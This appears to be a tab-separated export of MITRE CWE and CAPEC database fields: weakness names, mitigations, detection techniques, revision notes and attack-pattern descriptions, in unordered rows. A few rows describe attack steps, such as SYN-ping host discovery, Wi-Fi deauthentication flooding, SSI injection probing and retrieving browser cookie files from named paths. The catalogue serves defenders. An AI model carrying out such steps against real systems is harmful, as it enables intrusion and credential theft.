10946	89	Meta
24441	42	If certificate pinning is being used, ensure that all relevant properties of the certificate are fully validated before the certificate is pinned, including the expiration.
16976	62	updated Related_Attack_Patterns
24474	35	MITRE
6993	79	Confidentiality
20379	88	Explicit Call to Finalize()
10822	63	Other
21885	56	ChildOf
18532	43	Simple
7406	76	2019-04-04
12195	25	Medium
11210	26	Architecture and Design
6016	39	2017-11-08
20919	85	328
16774	26	Implementation
10280	74	2
8986	28	CWE Content Team
5892	35	Cigital
17284	35	MITRE
9457	54	High
18001	61	Stable
6479	91	Implementation
8003	48	03
8447	62	updated Other_Notes, Potential_Mitigations
13014	35	MITRE
18696	77	Automated Static Analysis - Source Code
19072	76	2018-07-31
14375	81	Access Control
23255	33	Michael Hartl
10500	91	Architecture and Design
19677	91	Architecture and Design
9916	85	622
24012	33	Shengzhi Zhang
8227	35	MITRE
12511	28	CWE Content Team
13952	56	ChildOf
16121	63	Read Application Data
18666	39	2014-07-30
22098	103	Primary
7169	53	The MITRE Corporation
15385	53	The MITRE Corporation
22580	103	Primary
24005	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
23171	93	Moderate
23628	104	79
19192	66	DOM based XSS Prevention Cheat Sheet
12811	50	Use OS-level preventative functionality. Not a complete solution.
24917	30	Adam Barth
8637	104	118
9173	102	ChildOf
10039	63	Execute Unauthorized Code or Commands
12812	35	MITRE
8726	95	[Monitor responses] Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?
17594	63	Read Application Data
6133	39	2012-10-30
17825	80	To create symlinks
9457	78	High
12403	89	Detailed
9557	76	2017-08-04
6813	57	Primary
17053	91	Architecture and Design
18223	39	2010-06-21
21977	35	KDM Analytics
24779	35	MITRE
21995	62	updated Relationships, Taxonomy_Mappings
18981	35	MITRE
24159	26	Implementation
17421	26	Architecture and Design
14733	56	ChildOf
23153	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
20278	73	An attacker employs a myriad of standard techniques to get the victim to visit his or her malicious site or by some other means get the attackers' malicious code executing in the victim's browser.
6112	43	Simple
10002	33	Frank Kim
22570	39	2008-10-14
15117	35	Cigital
19022	28	CWE Content Team
11921	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
22160	35	MITRE
9463	35	MITRE
15431	81	Availability
8603	62	added/updated white box definitions
13624	90	C
14270	69	Draft
23608	55	CAPEC Content Team
10205	23	A certificate expiration is not validated or is incorrectly validated, so trust may be assigned to certificates that have been abandoned due to age.
7024	28	CWE Content Team
8612	61	Draft
25273	104	1070
13342	35	MITRE
10384	50	Forceful browsing can also be made difficult to a large extent by not hard-coding names of application pages or resources. This way, the attacker cannot figure out, from the application alone, the resources available from the present context.
22638	59	Updated Related_Weaknesses
20997	45	Base
20790	62	updated Common_Consequences
22400	39	2019-01-03
13980	62	updated Relationships
17270	62	updated Relationships
14996	25	Medium
19139	91	Testing
13529	80	If an attacker can steal a valid session ID, he can then try to be authenticated with that stolen session ID.
22532	76	2018-07-31
16281	79	Integrity
8605	26	Implementation
17657	56	ChildOf
21955	35	MITRE
11046	35	MITRE
12187	27	Scanners or utilities that provide the ability to send custom ICMP queries.
11831	35	MITRE
9950	102	ChildOf
15410	91	System Configuration
7887	62	updated Relationships, Taxonomy_Mappings
18579	28	CWE Content Team
25009	39	2008-07-01
6388	35	MITRE
11330	62	updated Relationships
21457	28	CWE Content Team
21587	28	CWE Content Team
16053	90	C
16988	35	Cigital
23275	35	MITRE
8076	39	2012-10-30
19979	35	MITRE
6859	91	Architecture and Design
9150	101	CAPEC Content Team
22935	66	Top 10 2007-Insecure Direct Object Reference
9834	45	Class
10827	91	Implementation
10371	62	updated Relationships
7552	46	This issue makes it more difficult to port or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
6823	39	2011-06-01
21680	97	Spoofing of UDDI/ebXML Messages
7920	35	MITRE
18952	76	2019-04-04
7623	59	Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
18819	88	Improper Enforcement of a Single, Unique Action
18922	57	Indirect
15907	35	MITRE
15438	62	updated Common_Consequences
16158	56	ChildOf
10293	21	PLOVER
9677	62	updated Common_Consequences
25057	94	By impersonating identities that have an increased level of access, an adversary gain privilege that they many not have otherwise had.
15930	90	Java
8949	81	Confidentiality
24607	74	2
19596	28	CWE Content Team
12666	31	1000
11367	35	MITRE
14291	52	Some instances of improper input validation can be detected using automated static analysis.                   A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.                   Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.
18617	85	143
22084	88	Weak Password Recovery Mechanism for Forgotten Password
11967	62	updated Relationships
21419	62	updated Description, Functional_Areas, Modes_of_Introduction, Relationships, Observed_Example, Relationship_Notes, Taxonomy_Mappings
20394	69	Draft
20094	86	http://brooksreview.net/2013/11/guest-post_scheming-for-privacy-and-security/
15083	39	2008-09-08
18036	103	Primary
22118	62	updated Description
24911	88	Information Exposure Through an Error Message
5629	43	Simple
13089	63	Reduce Maintainability
14422	26	Implementation
16589	61	Draft
15383	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.
17328	81	Non-Repudiation
11033	53	The MITRE Corporation
15652	91	Implementation
16038	103	Primary
20546	28	Eric Dalci
14428	35	MITRE
14637	28	CWE Content Team
17121	103	Primary
13401	28	CWE Content Team
11230	23	An adversary uses TCP SYN packets as a means towards host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN "synchronize" packet by completing stage two of the 'three-way handshake' - by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST "reset" packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response. Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present, SYN pings are preferable to ACK pings because a stateful firewall will typically drop all unsolicited ACK packets as they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. Often, an adversary will alternate between SYN and ACK pings to discover if a host is alive.
21165	28	CWE Content Team
15620	72	No authentication takes place in this process, bypassing an assumed protection of encryption.
18158	33	Joan Bruna
10026	50	Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.
9552	90	Language-Independent
20988	39	2014-07-30
16905	39	2011-06-27
6414	35	MITRE
11730	28	Eric Dalci
18406	31	1000
16917	59	Updated Related_Weaknesses
20989	79	Authorization
21590	90	Java
19351	77	Manual Analysis
21189	67	Low
23722	67	Low
18896	39	2014-07-30
25228	47	Other
15052	27	A tool capable of sending and receiving packets from a remote system.
8845	55	CAPEC Content Team
10696	61	Draft
17872	72	An infinite loop will cause unexpected consumption of resources, such as CPU cycles or memory. The software's operation may slow down, or cause a long time to respond.
19479	63	Execute Unauthorized Code or Commands
6404	62	updated Applicable_Platforms, Other_Notes, Relationship_Notes
9573	35	MITRE
7922	39	2017-11-08
14941	35	MITRE
6719	81	Access Control
6472	90	Language-Independent
17295	28	CWE Content Team
19070	90	Language-Independent
5880	62	updated Demonstrative_Examples
20927	42	Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
8018	56	ChildOf
13964	94	Derive sensitive information about encrypted data. For mobile devices, depending on which keys are compromised, the attacker may be able to decrypt VOIP communications, impersonate the targeted caller, or access the enterprise VPN server.
23192	63	DoS: Resource Consumption (CPU)
20236	56	ChildOf
11507	62	updated Demonstrative_Examples, Relationships
20005	28	CWE Content Team
10559	39	2011-06-27
13941	28	CWE Content Team
22579	28	CWE Content Team
23055	73	Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.
19041	61	Stable
15536	63	Read Files or Directories
22697	63	Bypass Protection Mechanism
10377	100	The MITRE Corporation
18531	51	2018-04-25
5647	28	CWE Content Team
20310	28	CWE Content Team
23699	35	MITRE
19825	35	MITRE
13208	28	CWE Content Team
22828	62	updated Potential_Mitigations
18093	35	MITRE
22256	38	Many invalid login attempts are coming from the same machine (same IP address) or for the same log in name. The login attempts use passwords that are dictionary words.
13422	21	CLASP
21672	39	2008-11-24
21743	35	MITRE
17355	46	As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions.             One example of a section delimiter is the boundary string in a multipart MIME message. In many cases, doubled line delimiters can serve as a section delimiter.
10465	35	MITRE
13641	35	MITRE
21721	28	CWE Content Team
17659	28	CWE Content Team
18942	42	Consider storing cryptographic hashes of passwords as an alternative to storing in plaintext.
18496	76	2018-07-31
8409	21	CWE Content Team
15811	35	MITRE
12642	63	DoS: Resource Consumption (Memory)
10612	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
24409	35	MITRE
24465	31	1000
8795	28	CWE Content Team
7600	39	2009-03-10
25170	90	Language-Independent
18395	31	1000
22975	77	Manual Static Analysis - Source Code
10934	45	Base
21274	35	MITRE
5709	90	Language-Independent
15625	28	CWE Content Team
7411	79	Confidentiality
10212	62	updated Relationships
24308	59	Updated References, Related_Weaknesses
22285	80	Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the attacker needs to write the shell code to accomplish his or her goals, but the attacker also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled attacker.
7985	39	2011-06-01
18143	23	The UI performs the wrong action with respect to the user's request.
19889	28	CWE Content Team
5624	23	In this attack scenario, the attacker actively transmits on the Wi-Fi channel to prevent users from transmitting or receiving data from the targeted Wi-Fi network. There are several known techniques to perform this attack – for example: the attacker may flood the Wi-Fi access point (e.g. the retransmission device) with deauthentication frames. Another method is to transmit high levels of noise on the RF band used by the Wi-Fi network.
24647	35	MITRE
16918	81	Access Control
17730	39	2019-06-20
10756	42	Always verify the length of the string unit character.
21121	62	updated Detection_Factors, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
23245	69	Incomplete
14508	43	Simple
6439	28	CWE Content Team
7906	28	CWE Content Team
12720	104	923
17746	28	CWE Content Team
11696	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
22423	39	2012-05-11
15325	45	Base
16321	100	The MITRE Corporation
8273	28	CWE Content Team
6913	62	updated Name
13650	28	CWE Content Team
13273	35	Cigital
18925	35	Cigital
20023	94	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
22560	28	CWE Content Team
15457	39	2008-07-01
18086	100	The MITRE Corporation
19974	81	Integrity
18442	89	Detailed
10860	28	Eric Dalci
9877	44	Limited
17438	62	updated Related_Attack_Patterns
22015	28	CWE Content Team
6143	35	MITRE
7676	35	MITRE
17566	26	Architecture and Design
8628	96	2008-01-30
11439	62	updated Taxonomy_Mappings
12363	66	Windows driver vulnerabilities: the METHOD_NEITHER odyssey
15050	50	Implementation: Use XML parsing tools that protect against DTD attacks.
13497	97	Calling Micro-Services Directly
18594	39	2017-11-08
23675	62	updated Description
10214	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
23181	62	updated Time_of_Introduction
15473	26	Implementation
7245	35	MITRE
11228	49	2007
15890	28	Eric Dalci
20412	50	Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.
20288	35	MITRE
13152	79	Authorization
17910	62	updated Time_of_Introduction
24355	62	updated Description, Potential_Mitigations
8087	35	MITRE
14106	35	MITRE
8249	78	Low
12173	77	Manual Static Analysis
6358	59	Updated Examples-Instances, Related_Attack_Patterns
20389	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
6329	63	DoS: Resource Consumption (Other)
22621	26	Architecture and Design
18782	71	2003
21046	35	MITRE
24262	86	http://phpsec.org/articles/2005/password-hashing.html
11371	49	2000
15121	88	J2EE Bad Practices: Direct Use of Threads
22548	27	The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.
13579	36	http://www.dnssec.net/dns-threats.php
24572	97	Signature Spoofing by Key Recreation
15135	39	2011-09-13
17803	50	Use Strong mutual authentication to always fully authenticate both ends of any communications channel.
12344	30	Patrick Morley
13814	72	If the incorrect calculation causes the program to move into an unexpected state, it may lead to a crash or impairment of service.
16838	33	Norm Hardy
7732	32	Beyond Security
10175	56	ChildOf
23155	35	MITRE
16385	53	The MITRE Corporation
15020	39	2012-05-11
8211	57	Primary
12309	62	updated Relationships, Taxonomy_Mappings
21426	62	updated Description, Related_Attack_Patterns
22696	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
8143	91	Implementation
12049	35	MITRE
19931	24	MITRE
8797	35	MITRE
22664	95	[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted, receives a consistent amount of traffic, and is a homophone.
15936	28	CWE Content Team
7828	35	MITRE
18196	28	CWE Content Team
5770	90	C
18287	35	MITRE
22465	81	Other
13811	60	31
10422	56	ChildOf
20139	28	CWE Content Team
21019	85	615
24612	31	699
21831	62	updated Potential_Mitigations
14040	35	MITRE
10521	25	Low
19933	35	Cigital
7029	62	Suggested OWASP Top Ten 2004 mapping
13355	104	527
22372	39	2011-06-01
8747	79	Integrity
20429	23	The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.
19357	52	Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.
6405	85	183
10736	28	CWE Content Team
6579	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
10441	79	Authorization
18859	88	Covert Timing Channel
10616	96	2018-07-02
6636	49	2010
10866	31	699
9778	62	updated Demonstrative_Examples
15330	62	added/updated white box definitions
17915	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
17602	99	Addison Wesley
19688	62	updated Description, Other_Notes
9567	35	MITRE
9525	94	Modifying communications after successful deciphering of protocol information compromises integrity.
22113	79	Access Control
6881	62	updated Demonstrative_Examples
11791	28	CWE Content Team
20440	28	CWE Content Team
10331	71	2004
14793	39	2017-11-08
8806	81	Access Control
13055	27	None: No specialized resources are required to execute this type of attack. In some cases, the attacker need not even have direct access to the locations on the target computer where the targeted resources reside.
10651	39	2011-03-29
18987	45	Variant
11596	104	8
6500	91	Operation
6240	103	Primary
25103	28	CWE Content Team
16820	70	OWASP Testing Guide
19490	33	Web Application Security Consortium
22194	39	2019-06-20
15389	62	updated Applicable_Platforms, Relationships, Other_Notes, Taxonomy_Mappings
18953	62	updated Relationships
10013	39	2010-02-16
13501	51	2014-06-23
22615	79	Authorization
17879	45	Base
16400	35	MITRE
6773	28	CWE Content Team
16431	23	The software does not adequately filter user-controlled input for special elements with control implications.
12551	69	Draft
10082	35	MITRE
9029	72	Doubly freeing memory may result in a write-what-where condition, allowing an attacker to execute arbitrary code.
19058	42	Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits.
20001	39	2011-06-27
21738	62	updated Relationships
18170	39	2011-06-01
21613	62	updated Potential_Mitigations
23370	28	CWE Content Team
23137	44	High
19625	56	ChildOf
23962	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
11555	28	CWE Content Team
23097	78	High
6228	35	MITRE
18824	62	updated Related_Attack_Patterns, Relationships
11501	96	2008-01-30
15402	85	579
24103	47	Read Data
15925	35	MITRE
12703	85	472
20082	39	2017-11-08
11153	88	Unprotected Alternate Channel
15494	35	MITRE
6877	103	Primary
24881	101	CAPEC Content Team
12314	26	Implementation
16021	50	Utilize strict type, character, and encoding enforcement.
17885	89	Standard
19254	70	HTTP Response Smuggling
14260	104	826
20880	39	2012-05-11
23802	63	Other
13599	62	updated Potential_Mitigations
13134	27	Any type of active probing that involves non-standard packet headers requires the use of raw sockets, which is not available on particular operating systems (Microsoft Windows XP SP 2, for example). Raw socket manipulation on Unix/Linux requires root privileges.                A tool capable of sending and receiving packets from a remote system.
22588	45	Variant
23312	28	CWE Content Team
18543	88	Information Exposure Through Externally-Generated Error Message
10247	39	2014-07-30
19588	63	Reduce Maintainability
20253	35	MITRE
11805	79	Authentication
23183	43	Simple
6023	70	WASC Threat Classification 2.0
12889	49	2009
24662	33	Heine Deelstra
6996	24	MITRE
14463	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.
6439	62	updated Potential_Mitigations
17434	35	MITRE
14583	62	updated Time_of_Introduction
8687	28	Eric Dalci
23037	45	Base
12701	62	updated Applicable_Platforms, Causal_Nature, Likelihood_of_Exploit, Modes_of_Introduction, Relationships
16731	31	1000
18337	39	2012-10-30
6725	63	Execute Unauthorized Code or Commands
6985	62	updated Relationships
8757	103	Primary
11593	42	During development, do not mark it as safe for scripting.
13770	23	The software does not drop privileges before passing control of a resource to an actor that does not have those privileges.
18172	81	Confidentiality
6227	81	Availability
17495	62	updated White_Box_Definitions
8266	63	Modify Files or Directories
14858	39	2011-06-01
18118	24	Purdue University
7048	56	PeerOf
19257	35	MITRE
24477	62	updated Context_Notes
14321	62	updated Alternate_Terms, Relationships, Relationship_Notes, Taxonomy_Mappings, Theoretical_Notes
17885	50	To mitigate this type of an attack, explicit intents should be used whenever sensitive data is being sent. An explicit intent is delivered to a specific application as declared within the intent, whereas the Android operating system determines who receives an implicit intent which could potentially be a malicious application. If an implicit intent must be used, then it should be assumed that the intent will be received by an unknown application and any response should be treated accordingly. Implicit intents should never be used for inter-application communication.
24815	31	699
11888	39	2011-06-01
9772	31	699
8486	89	Standard
12449	39	2012-10-30
12042	28	CWE Content Team
11125	56	ChildOf
7475	54	Medium
15727	47	Execute Unauthorized Commands
24919	53	The MITRE Corporation
12364	42	Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered.
22297	81	Confidentiality
21557	97	Signal Strength Tracking
21203	28	CWE Content Team
8705	22	05
23626	66	Top 10 2007-Broken Authentication and Session Management
9133	39	2012-05-11
14813	62	updated Potential_Mitigations
19345	39	2014-07-30
7323	31	1000
25334	43	Simple
15823	79	Authorization
12864	32	The PHP Group
24203	62	updated Demonstrative_Examples
10053	35	MITRE
13473	104	274
9568	91	Architecture and Design
19723	88	Improper Enforcement of Message or Data Structure
13390	62	updated Relationships
9331	25	Low
16504	39	2012-10-30
7845	58	There are three types of components that can be exported in an Android application.                Activity                An Activity is an application component that provides a UI for users to interact with. A typical application will have multiple Activity screens that perform different functions, such as a main Activity screen and a separate settings Activity screen.                Service                A Service is an application component that is started by another component to execute an operation in the background, even after the invoking component is terminated. Services do not have a UI component visible to the user.                Content Provider                The Content Provider mechanism can be used to share data with other applications or internally within the same application.
11468	28	CWE Content Team
7129	35	MITRE
22465	63	Alter Execution Logic
7229	28	CWE Content Team
9035	25	High
18841	97	Using Malicious Files
16779	35	MITRE
5643	62	updated Related_Attack_Patterns
7269	46	Cloneable classes are effectively open classes, since data cannot be hidden in them. Classes that do not explicitly deny cloning can be cloned by any other class without running the constructor.
19392	55	CAPEC Content Team
19404	39	2009-07-27
5759	91	Implementation
22257	62	updated Common_Consequences
15498	28	CWE Content Team
22284	39	2008-07-01
22072	66	ACROS Security: Remote Binary Planting in Apple iTunes for Windows (ASPR #2010-08-18-1)
10144	89	Standard
18898	92	Experiment
21591	39	2009-12-28
23088	79	Authorization
17996	28	Eric Dalci
23095	76	2019-04-04
7638	63	Execute Unauthorized Code or Commands
10289	39	2012-05-11
21072	35	MITRE
21036	62	updated Potential_Mitigations
22887	39	2008-11-24
25367	77	Automated Analysis
20671	39	2011-06-01
16011	39	2009-03-10
14341	76	2017-08-04
15552	28	CWE Content Team
8165	62	updated Related_Attack_Patterns, Relationships
14868	62	updated References, Relationships
21108	92	Exploit
13366	28	Eric Dalci
8345	85	521
13872	28	CWE Content Team
14081	62	updated Relationships, Observed_Example, Taxonomy_Mappings
6350	39	2011-06-01
13369	101	CAPEC Content Team
18686	35	MITRE
13844	26	Architecture and Design
10576	35	MITRE
24560	88	Missing Serialization Control Element
17703	28	CWE Content Team
10695	103	Primary
16663	62	updated References, Relationships
17652	66	Exploiting Software: How to Break Code
10583	62	Suggested OWASP Top Ten 2004 mapping
19431	103	Primary
17240	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
9764	81	Access Control
21655	32	National Institute of Standards and Technology (NIST)
10576	39	2011-06-01
24713	35	MITRE
25010	55	CAPEC Content Team
20286	39	2012-05-11
11412	21	PLOVER
16536	39	2015-12-07
10766	76	2015-11-09
18545	35	MITRE
15775	46	Improper use of chroot() may allow attackers to escape from the chroot jail. The chroot() function call does not change the process's current working directory, so relative paths may still refer to file system resources outside of the chroot jail after chroot() has been called.
24772	72	An attacker could gain unauthorized access to the system by retrieving legitimate user's authentication credentials.
9913	62	updated Potential_Mitigations
7835	39	2013-07-17
18811	85	122
11696	28	CWE Content Team
10624	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
14820	63	DoS: Resource Consumption (Other)
21418	66	Hold Your Sessions: An Attack on Java Session-id Generation
12952	62	updated Common_Consequences
9633	48	02
16798	101	CAPEC Content Team
15867	55	CAPEC Content Team
6270	28	CWE Content Team
6954	30	Chris Evans
7012	28	CWE Content Team
22548	40	The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.
6033	92	Experiment
23064	21	PLOVER
23317	62	updated Potential_Mitigations
24457	69	Incomplete
25214	35	MITRE
12769	45	Class
5623	28	CWE Content Team
14264	28	CWE Content Team
25293	97	Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions
6768	44	SOAR Partial
20516	86	https://developer.apple.com/library/ios/releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html
23916	26	Implementation
22306	31	1003
20986	62	updated Common_Consequences
21219	35	MITRE
20213	63	Gain Privileges or Assume Identity
19071	23	An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.
17856	42	Use a language that is not susceptible to these issues. However, be careful of null byte interaction errors (CWE-626) with lower-level constructs that may be written in a language that is susceptible.
10334	45	Variant
22194	62	updated Related_Attack_Patterns, Relationships, Type
23860	35	Cigital
13429	39	2008-11-24
12303	28	CWE Content Team
9338	62	updated Observed_Examples, Relationships
19847	62	updated Description
9156	28	CWE Content Team
10507	28	Eric Dalci
22639	62	updated Relationships
16589	89	Standard
12097	28	CWE Content Team
22302	26	Implementation
14960	28	CWE Content Team
18935	35	MITRE
23966	27	Any tool that enables intercepting and tampering with HTTP requests
22431	63	Read Files or Directories
7859	50	Implementation: Enforce audit logging on code and configuration promotion procedures.
19342	76	2018-07-31
5776	79	Integrity
8819	90	Language-Independent
7855	59	Updated Related_Attack_Patterns
8911	103	Primary
10181	39	2014-07-30
17030	62	updated Common_Consequences, Description
10583	35	Veracode
13462	56	ChildOf
20119	45	Base
23196	28	CWE Content Team
13897	35	MITRE
21377	35	MITRE
23706	35	MITRE
18343	23	The software does not properly verify that a critical resource is owned by the proper entity.
22257	28	CWE Content Team
9654	78	High
15133	26	Architecture and Design
12218	70	OWASP Cheatsheets
5793	91	Implementation
6454	76	2017-08-04
25225	62	updated Relationships, Taxonomy_Mappings
12243	39	2014-02-18
19364	79	Non-Repudiation
18539	28	CWE Content Team
12958	43	Simple
8223	48	12
19927	90	Language-Independent
6501	62	updated Relationships
13183	77	Dynamic Analysis with Automated Results Interpretation
12976	62	updated Relationships
7990	92	Experiment
16951	21	PLOVER
9309	43	Simple
15814	91	Architecture and Design
7436	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
19700	103	Primary
9845	88	Sensitive Data Storage in Improperly Locked Memory
9427	35	MITRE
17396	28	CWE Content Team
18020	59	Updated Related_Attack_Patterns
20784	76	2015-11-09
7881	39	2008-07-01
22563	62	updated Relationships
18409	79	Integrity
13764	63	Read Memory
14338	51	2019-09-30
7342	63	Modify Memory
11713	31	1000
23636	66	Exploiting design flaws in the Win32 API for privilege escalation. Or... Shatter Attacks - How to break Windows
15198	88	Improper Address Validation in IOCTL with METHOD_NEITHER I/O Control Code
17686	32	http://my.opera.com/securitygroup/blog/2013/06/26/opera-infrastructure-attack
10479	39	2019-01-03
15511	35	MITRE
9203	88	Direct Use of Unsafe JNI
18314	56	ChildOf
22249	39	2009-07-27
22339	97	Eavesdropping
12482	88	Improper Control of Dynamically-Managed Code Resources
12358	28	CWE Content Team
12069	35	MITRE
7967	26	Architecture and Design
7713	23	According to WASC, "Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization."
9222	31	1000
11126	79	Availability
19852	28	CWE Content Team
19560	30	Ayal Y.
20711	51	2014-06-23
12034	28	CWE Content Team
18461	73	Use web browser to inject input through text fields or through HTTP GET parameters.
16731	56	ChildOf
23418	62	updated Demonstrative_Examples
17470	26	Implementation
8272	71	1980
17672	81	Other
24012	60	24
22842	62	updated Common_Consequences, Demonstrative_Examples, Description, Detection_Factors, Name, Potential_Mitigations, References, Relationships
11047	79	Confidentiality
6275	39	2019-01-03
14587	62	updated Description, Other_Notes
5981	95	[Attempt SSI] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.
15464	62	updated Relationships
19034	39	2010-09-27
6795	35	Cigital
10896	39	2012-10-30
9942	35	MITRE
25297	35	Cigital
11424	62	updated Relationships, Taxonomy_Mappings
20907	23	The software contains a data query against an SQL table or view      that is configured in a way that does not utilize an index and may cause      sequential searches to be performed.
24113	40	The targeted SOAP server must trust that the array size as stated in messages it receives is correct, but read through the entire content of the message regardless of the stated size of the array.
15414	51	2014-06-23
15668	39	2010-06-21
18893	51	2014-06-23
9914	28	CWE Content Team
13573	79	Authorization
9706	35	MITRE
22261	28	CWE Content Team
9762	91	Operation
7357	39	2009-03-10
24445	73	Obtain cookie from local filesystem (e.g. C:\Documents and Settings\*\Cookies and C:\Documents and Settings\*\Application Data\Mozilla\Firefox\Profiles\*\cookies.txt in Windows)
6482	101	CAPEC Content Team
10002	48	03
12051	62	updated Applicable_Platforms
18543	57	Resultant
9845	69	Draft
19448	92	Exploit
